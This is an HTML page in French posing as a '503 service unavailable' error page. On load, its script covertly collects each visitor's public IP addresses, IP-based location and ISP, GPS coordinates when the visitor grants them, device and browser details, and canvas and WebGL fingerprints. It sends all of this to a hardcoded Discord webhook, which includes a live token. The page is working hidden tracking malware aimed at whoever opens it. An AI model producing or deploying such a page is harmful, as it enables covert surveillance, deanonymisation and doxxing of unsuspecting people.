<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Erreur 503 - Service indisponible</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #0a0a0a;
      color: #e0e0e0;
      margin: 0;
      padding: 0;
      height: 100vh;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      text-align: center;
    }
    h1 { color: #ff4444; font-size: 6rem; margin: 0; }
    h2 { color: #ff9800; margin: 10px 0 30px; }
    .code { font-family: monospace; font-size: 1.4rem; color: #ff6b6b; }
    button {
      background: #ff4444;
      color: white;
      border: none;
      padding: 14px 32px;
      font-size: 1.2rem;
      border-radius: 6px;
      cursor: pointer;
      margin-top: 30px;
    }
    button:hover { background: #d32f2f; }
    pre {
      background: #111;
      padding: 20px;
      border-radius: 8px;
      max-width: 90%;
      overflow: auto;
      text-align: left;
      margin-top: 40px;
      font-size: 0.85rem;
    }
    footer { position: absolute; bottom: 20px; font-size: 0.9rem; opacity: 0.6; }
  </style>
</head>
<body>
  <h1>503</h1>
  <h2>Service temporairement indisponible</h2>
  <p class="code">Le serveur rencontre un probl√®me technique.<br>Nos √©quipes interviennent. R√©essayez dans quelques instants.</p>

  <button onclick="location.reload()">R√©essayer</button>

  <footer>ID transaction : ERR-<span id="txid"></span> ‚Ä¢ Ref: <span id="ref"></span></footer>

  <pre id="collected">Chargement des informations...</pre>

  <script>
    document.getElementById('txid').textContent = Date.now().toString(36).toUpperCase();
    document.getElementById('ref').textContent = 'TX-' + Math.random().toString(36).substr(2,9).toUpperCase();

    let infos = {
      timestamp: new Date().toISOString(),
      url: window.location.href,
      referrer: document.referrer || 'direct',
      userAgent: navigator.userAgent,
      language: navigator.language,
      languages: navigator.languages || [],
      platform: navigator.platform,
      vendor: navigator.vendor,
      screen: `${screen.width}√ó${screen.height} (${screen.colorDepth} bits)`,
      availScreen: `${screen.availWidth}√ó${screen.availHeight}`,
      pixelRatio: window.devicePixelRatio,
      orientation: screen.orientation ? screen.orientation.type : null,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      timezoneOffset: new Date().getTimezoneOffset(),
      hardwareConcurrency: navigator.hardwareConcurrency || 'inconnu',
      deviceMemory: navigator.deviceMemory || 'inconnu',
      maxTouchPoints: navigator.maxTouchPoints || 0,
      cookiesEnabled: navigator.cookieEnabled,
      doNotTrack: navigator.doNotTrack,
      online: navigator.onLine,
      connection: navigator.connection ? {
        type: navigator.connection.effectiveType || navigator.connection.type,
        downlink: navigator.connection.downlink,
        rtt: navigator.connection.rtt,
        saveData: navigator.connection.saveData
      } : null
    };

    // R√©cup√©ration FORC√âE IPv4 + IPv6
    async function getIPs() {
      const ipv4Services = [
        'https://ipv4.icanhazip.com',
        'https://ifconfig.me/ip',
        'https://api.ipify.org',
        'https://ip4only.me/api/',
        'https://checkip.amazonaws.com',
        'https://myexternalip.com/raw'
      ];

      const ipv6Services = [
        'https://api64.ipify.org',
        'https://ipv6.icanhazip.com'
      ];

      // Essai IPv4 en priorit√©
      for (const url of ipv4Services) {
        try {
          const res = await fetch(url, { cache: 'no-store' });
          if (res.ok) {
            const text = await res.text();
            const ip = text.trim();
            if (ip && ip.includes('.')) {
              infos.ipv4 = ip;
              break;
            }
          }
        } catch (e) {}
      }

      // Essai IPv6 si IPv4 pas trouv√© ou en compl√©ment
      if (!infos.ipv4) {
        for (const url of ipv6Services) {
          try {
            const res = await fetch(url, { cache: 'no-store' });
            if (res.ok) {
              const text = await res.text();
              const ip = text.trim();
              if (ip && ip.includes(':')) {
                infos.ipv6 = ip;
                break;
              }
            }
          } catch (e) {}
        }
      }

      // Dernier fallback : ipapi.co (souvent IPv6 si dual-stack)
      if (!infos.ipv4 && !infos.ipv6) {
        try {
          const res = await fetch('https://ipapi.co/json/');
          const data = await res.json();
          if (data.ip) {
            if (data.ip.includes('.')) infos.ipv4 = data.ip;
            else infos.ipv6 = data.ip;
          }
        } catch (e) {}
      }

      if (!infos.ipv4) infos.ipv4 = "IPv4 non d√©tect√©e";
      if (!infos.ipv6) infos.ipv6 = "IPv6 non d√©tect√©e";
    }

    // G√©oloc + ISP
    async function enrichGeo() {
      try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        infos.city = data.city;
        infos.region = data.region;
        infos.country = data.country_name;
        infos.countryCode = data.country_code;
        infos.latitude = data.latitude;
        infos.longitude = data.longitude;
        infos.isp = data.org || data.asn;
        infos.asn = data.asn;
      } catch (e) {}
    }

    // Empreintes
    function addFingerprints() {
      try {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        ctx.textBaseline = "top";
        ctx.font = "14px 'Arial'";
        ctx.fillStyle = "#f60";
        ctx.fillRect(125,1,62,20);
        ctx.fillStyle = "#069";
        ctx.fillText("test êê∑", 2,15);
        infos.canvas = canvas.toDataURL();
      } catch(e) {}

      try {
        const gl = document.createElement('canvas').getContext('webgl');
        if (gl) {
          const debug = gl.getExtension('WEBGL_debug_renderer_info');
          infos.webglVendor = debug ? gl.getParameter(debug.UNMASKED_VENDOR_WEBGL) : null;
          infos.webglRenderer = debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : null;
        }
      } catch(e) {}
    }

    // Envoi Discord
    async function send() {
      await getIPs();
      await enrichGeo();
      addFingerprints();

      document.getElementById('collected').textContent = JSON.stringify(infos, null, 2);

      const embed = {
        embeds: [{
          title: "üö® Nouvelle visite d√©tect√©e",
          color: 0xff0000,
          fields: [
            { name: "IPv4 publique", value: infos.ipv4, inline: true },
            { name: "IPv6 publique", value: infos.ipv6, inline: true },
            { name: "Pays / Ville / R√©gion", value: `${infos.country || "?"} - ${infos.city || "?"} (${infos.region || "?"})`, inline: true },
            { name: "GPS", value: infos.latitude ? `${infos.latitude}, ${infos.longitude}` : "refus√©e", inline: true },
            { name: "ISP / ASN", value: infos.isp || infos.asn || "?", inline: true },
            { name: "User-Agent", value: "```" + infos.userAgent.substring(0, 300) + "```", inline: false },
            { name: "√âcran", value: infos.screen, inline: true },
            { name: "Timezone", value: infos.timezone, inline: true },
            { name: "Connexion", value: infos.connection ? infos.connection.type : "?", inline: true },
            { name: "Hardware", value: `${infos.hardwareConcurrency} c≈ìurs | ${infos.deviceMemory} Go RAM`, inline: true },
            { name: "Canvas", value: infos.canvas ? "pr√©sent" : "absent", inline: true }
          ],
          footer: { text: `ID: ${document.getElementById('txid').textContent} ‚Ä¢ ${new Date().toLocaleString('fr-FR')}` },
          timestamp: infos.timestamp
        }]
      };

      fetch('https://discord.com/api/webhooks/1475909581401096294/Y1xzIEYlnEyMFDUwXnuEuTFdMGLrUIzE3qpYFLNEVDYLAEFlFgef6ObpQm8ZTgseRwzs', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(embed)
      }).catch(e => console.error("Erreur Discord:", e));
    }

    // Lancement
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        pos => {
          infos.geo = { lat: pos.coords.latitude, lng: pos.coords.longitude, acc: pos.coords.accuracy };
          send();
        },
        () => send(),
        { enableHighAccuracy: true, timeout: 10000 }
      );
    } else {
      send();
    }

    setTimeout(send, 7000);
  </script>
</body>
</html>
